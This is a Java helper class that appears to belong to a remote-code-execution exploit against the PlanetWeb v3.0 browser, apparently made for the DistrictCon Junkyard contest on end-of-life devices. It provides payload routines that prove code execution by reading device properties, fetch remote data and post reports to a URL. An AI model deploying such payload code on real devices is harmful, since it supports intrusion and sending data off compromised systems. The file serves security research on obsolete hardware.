package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.system.SystemInterface;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.ByteArrayOutputStream;
import java.net.URL;
import java.net.HttpURLConnection;

/** Shared payload helpers (PersonalJava 1.1 compatible). */
public class Junk {
    public static final String BASE = "http://eden.planetweb.com";

    public static void banner(String what) {
        Eden.println("=================================================");
        Eden.println("  DistrictCon Junkyard -- PlanetWeb v3.0 RCE");
        Eden.println("  " + what);
        Eden.println("=================================================");
    }

    /** read on-device-only properties: proves our code runs on the target */
    public static void prove() {
        try {
            Eden.println("os.name=" + System.getProperty("os.name")
                + " os.arch=" + System.getProperty("os.arch")
                + " java=" + System.getProperty("java.version"));
            Eden.println("browser=" + System.getProperty("browser"));
        } catch (Throwable t) { Eden.println("[!] prop read: " + t); }
    }

    public static void openURL(String url) {
        try {
            SystemInterface si = Eden.getSystemInterface();
            if (si != null) { si.openURL(url); Eden.println("[+] openURL -> " + url); }
        } catch (Throwable t) { Eden.println("[!] openURL: " + t); }
    }

    public static byte[] httpGet(String url) throws Exception {
        InputStream in = new URL(url).openStream();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] b = new byte[8192]; int n;
        while ((n = in.read(b)) > 0) bos.write(b, 0, n);
        in.close(); return bos.toByteArray();
    }

    public static void httpPost(String url, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            byte[] b = body.getBytes();
            c.setRequestProperty("Content-Length", String.valueOf(b.length));
            OutputStream os = c.getOutputStream(); os.write(b); os.close();
            c.getInputStream().close();
        } catch (Throwable t) { Eden.println("[!] report POST: " + t); }
    }
}
